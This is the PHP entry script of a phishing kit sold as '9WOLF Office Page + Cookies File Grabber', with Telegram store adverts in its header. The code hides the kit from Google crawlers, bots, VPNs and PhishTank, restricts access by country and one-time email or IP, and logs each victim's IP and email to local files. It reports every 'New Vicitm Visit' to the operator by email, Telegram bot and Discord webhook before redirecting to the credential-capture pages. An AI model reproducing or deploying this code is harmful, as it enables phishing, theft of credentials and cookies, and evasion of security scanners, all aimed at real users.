<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(E_ALL ^ E_NOTICE);
ob_start();
session_start();
$path = "./site/";
require ("9WOLFConfi/Guration.php");
require ("9WOLFConfi/Function.php");
require ("9WOLFDecline/AntiBotIp.php");
require ("9WOLFDecline/AntiBotPw.php");
require ("9WOLFDecline/AntiBotKillBot.php");
require ("9WOLFDecline/AntiBotUserAgent.php");
require ("9WOLFDecline/AntiBotIsp.php"); 
require ("9WOLFDecline/AnitiBotHost.php");
require ("9WOLFDecline/AntiBotPhishTank.php");
require ("9WOLFDecline/AntiBotVpn.php");
require ("9WOLFDecline/AntiBotProxy.php");
require ("9WOLFDecline/AntBotProtection.php");
require ("9WOLFDecline/SaveBrowsing.php");
require ("9WOLFDecline/DiscoveredBot.php");
require ("9WOLFDecline/AntiBotThree.php");
require ("9WOLFDecline/DisturbOne.php");
require ("9WOLFDecline/DisturbTwo.php");
require("9WOLFDecline/Anti/Bot-Crawler.php");
@require("9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include($path."index.php"); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { include($path."index.php"); exit(); }

$rand = generateRandomString(130);
$ip = getIp();
$Allvisitor = dataVisitor($ip)."\n";
$_SESSION['ipFullData'] = $Allvisitor;
$AllvisitorFile = fopen("9WOLFHost/Fishes/4ll.html","a");
fwrite($AllvisitorFile,$Allvisitor);
fclose($AllvisitorFile);
/* Get info */
$ip = getIp();
$data = GetData();
$city = $data['city'];
$country = $data['country'];
$Currency = $data['Currency'];
$Country_code = $data['Country_code'];
// Start Session 
$_SESSION["ip"] = $ip;
$_SESSION["country"] = $country;
$_SESSION["currency"] = $Currency;
$_SESSION["Country_code"] = $Country_code;
$countryBlock =strtolower($countryBlock);
$allowdCountry = strtolower($allowdCountry);
if ($countryBlock == "true") {
	if(countryLock(strtolower($Country_code),$allowdCountry) == false and $ip != $yourIPCountry ){
	    $message = ("9WOLF Declined => Country: ".$allowdCountry." [Not Allowed Country] :\n  || Date:".gmdate ("d M,Y")." Time:".gmdate ("g:i a")."\n\n");
	    $file = fopen("9WOLFGrabber/DiscoveredIp.txt","a");
		fwrite($file,$message."\n");
		fclose($file);
		include($path."index.php");exit();
		echo "country";

	}
}

	if (isset($_GET['ai'])) {
	 $ai = isset($_GET['ai']) ? trim(htmlentities($_GET['ai'])):'';
      if ($ai !== "xd") {
	  include($path."index.php");exit
	  ();

	  }
	}else{
		include($path."index.php");exit();
	}

$redirect = strtolower($redirect);
$redirectFrom = strtolower($redirectFrom);
if ($redirect == "true") {
	if(checkRedirect($redirectFrom) == false ){
		include($path."index.php");exit();
		echo "redirectFrom";

	}
}

$listSent = strtolower($listSent);
if ($listSent == "true") {
	if (isset($_GET['email'])) {
			$email = bs2EmailGrabber($_GET['email']);
		if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
			if ( CheckEmail($email) == false) {
				include($path."index.php");exit();
			}else{
				$_SESSION['emailGrabber'] = $email;
				$file = fopen("visitors/emails.txt","w");
				fwrite($file, $email);
				fclose($file);
			}
		}
	}else{
		echo "listSent";
		include($path."index.php");exit();
	}
}


$accessOneTime = strtolower($accessOneTime);
if ($accessOneTime == "true") {
	$email = bs2EmailGrabber($_GET['email']);
	if (isset($email)) {
		if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
						// echo accessOneTime($email);

			if (accessOneTime($email) == false and $email != $yourEmailGrabber) {
				include($path."index.php");exit();
				echo "emailAccess";

			}else{
				$file = fopen("9WOLFGrabber/emailListGrabber.txt","a");
				fwrite($file,$email."\n");
				fclose($file);
			}
		}
	}else{
		include($path."index.php");exit();
		echo "emailGrabberAcc";

		
	}
}

// if ($api_protection=="yes") {

// 		$ch=curl_init();
// 		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
// 		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
// 		curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/".$Key."/".$_SESSION['ip']."");
// 		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
// 		curl_setopt($ch,CURLOPT_TIMEOUT,400);
// 		$json=curl_exec($ch);

// 				$proxy = trim(strip_tags(get_string_between($json,'"proxy":',',"')));
// 				$tor = trim(strip_tags(get_string_between($json,'"tor":',',"')));
// 				$vpn = trim(strip_tags(get_string_between($json,'vpn":',',"')));
// 				$is_crawler = trim(strip_tags(get_string_between($json,'is_crawler":',',"')));
// 				$fraud_score = trim(strip_tags(get_string_between($json,'fraud_score":',',"')));
// 				$attempt = trim(strip_tags(get_string_between($json,'attempt":',',"')));

// 			$key = substr(sha1(mt_rand()),1,25);
			
// 			if ($anti_proxy=="yes") { if ($proxy == "true") {
// 				include($path."index.php");exit();
// 				}
// 			} 

// 			if ($anti_tor=="yes") { if ($tor == "true") {
// 				include($path."index.php");exit();
// 				}
// 			}

// 			if ($anti_vpn=="yes") { if ($vpn == "true") {
// 				include($path."index.php");exit();
// 				}
// 			}

// 			if ($anti_web_crawler=="yes") { if ($is_crawler == "true") {
// 				include($path."index.php");exit();
// 				}
// 			}

$accessOneTimeIp = strtolower($accessOneTimeIp);
if ($accessOneTimeIp == "true") {
	$ip = $_SESSION["ip"];
	$AllowedIp = $yourIPAceess;
	if (accessOneTimeIP($ip) == false and $ip != $AllowedIp) {
		include($path."index.php");exit();
		echo "ip";
	}else{
	    $message = ("9WOLF Declined => !p: ".$ip." [On Time Ip Access] :\n  || Date:".gmdate ("d M,Y")." Time:".gmdate ("g:i a")."\n\n");
		$file = fopen("9WOLFGrabber/DiscoveredIp.txt","a");
		fwrite($file,$message."\n");
		fclose($file);
	}
}

//here
$LogginIp = $_SESSION['ipFullData'];
$sessionIp = fopen("9WOLFHost/Fishes/4ll0w3d.html","a+");
fwrite($sessionIp,"$LogginIp"); 
fclose($sessionIp);

$telegramMsg ="
-------------".$PageName."-------------
[Hello ".$YourName."️🐺
[New Vicitm Visit🚀
-------------9WOLF-------------
[👤Login User IP |👉 ".$_SESSION['ipFullData']
."[🌐Browser👉".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." On ".WOLF_Os($_SERVER['HTTP_USER_AGENT'])."".";
[👤User Agent |👉 ".($_SERVER['HTTP_USER_AGENT'])."";

$discordMsg ="
-------------".$PageName."-------------
[Hello ".$YourName."️🐺
[New Vicitm Visit🚀
-------------9WOLF-------------
[👤Login User IP |👉 ".$_SESSION['ipFullData']."[🌐Browser👉".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT'])."".";
[👤User Agent |👉 ".($_SERVER['HTTP_USER_AGENT'])."";

          $Subject = "[New Vicitm Visit🚀️ \n";
          $headers .= "MIME-Version: 1.0" . "\r\n";
          $headers .= "From: ".$Owner.".<$WOLFServer>." . "\r\n";
          $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";
          $msg .= "-------------".$PageName."-------------️ \n \n";
          $msg .= "[[New Vicitm Visit🚀️ \n";
          $msg .= "[-------------9WOLF------------- \n";
          $msg .= "[👤Email Access      : ".$_SESSION['emailaccess']." ||\n";
          $msg .= "[👤Login User IP |👉 ".$_SESSION['ipFullData']."[🌐Browser👉".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT'])."".";
[👤User Agent |👉 ".($_SERVER['HTTP_USER_AGENT'])."";
          
    

if ($sendToEmail == "true") {
    $WOLFCoded = array(
        'msg' => $msg,
        'headers' => $headers,
        'Subject' => $Subject,
    );
    echo json_encode($WOLFCoded);
        
        send($yourEmail, $Subject, $msg,$headers);

      }
      
if ($sendToTelegramBot == "true") { 
    $WOLFCoded = array(
        'telegramMsg' => $telegramMsg,
        'discordMsg' => $discordMsg,
    );
    echo json_encode($WOLFCoded);
        send($telegramMsg,$botToken,$chatId);

      
 $WOLFApi="https://api.telegram.org/bot".$botToken;
  $sendToTelegramBot=[
      'chat_id'=> urlencode($chatId),
      'text'=> $telegramMsg,
  ];
  $ch = curl_init($WOLFApi . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($sendToTelegramBot));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $answer = curl_exec($ch);
  curl_close($ch);
 
     } 
 if ($sendToDiscordBot == "true"){
     $WOLFCoded = array(
        'discordMsg' => $discordMsg,
    );
    echo json_encode($WOLFCoded);
    $WOLFApi = $webHookUrl; 
    $json_data = array ('content'=>"$discordMsg");
    $make_json = json_encode($json_data);
    $ch = curl_init( $WOLFApi );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $answer = curl_exec($ch);
}    
      

if ($show_attempt_Page == "true") {
		     $_SESSION['9WOLF_SESSION_T0k3n'] = $WOLF_SESSION_T0k3n;
		     header("Location: ./$priv8=".$Country_code);exit();			

		}

$emailGrabber = strtolower($emailGrabber);
if ($emailGrabber =="true") {
	$email = bs2EmailGrabber($_GET['email']);
	if (isset($email) or filter_var($email, FILTER_VALIDATE_EMAIL)) {
		$_SESSION['emailaccess'] = $email;
	$_SESSION['9WOLF_SESSION_T0k3n'] = $WOLF_SESSION_T0k3n;
	header("Location: ./$priv0=".$Country_code);exit();
	}else{
	    echo "emailaccess";
	}
}else{
$_SESSION['9WOLF_SESSION_T0k3n'] = $WOLF_SESSION_T0k3n;
header("Location: ./$priv7=".$Country_code);
// header("Location: ./$priv7=$key=".$Country_code);
exit();
}
// }
?>